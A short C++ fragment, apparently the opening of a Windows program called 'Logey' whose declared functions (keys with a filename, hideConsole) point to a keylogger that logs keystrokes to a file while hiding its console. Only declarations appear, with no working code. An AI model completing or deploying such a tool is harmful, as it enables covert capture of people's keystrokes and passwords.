#include <iostream>
#include <Windows.h>

using namespace std;

/*
*	Global DEBUG variable
*	If true, the console will be shown and show live output.
*/
bool DEBUG = false;

const double LOGEY_VERSION = 1.02;

void keys(int key, char *filename);
void hideConsole();
void createNewInstanceHeader(char *filename);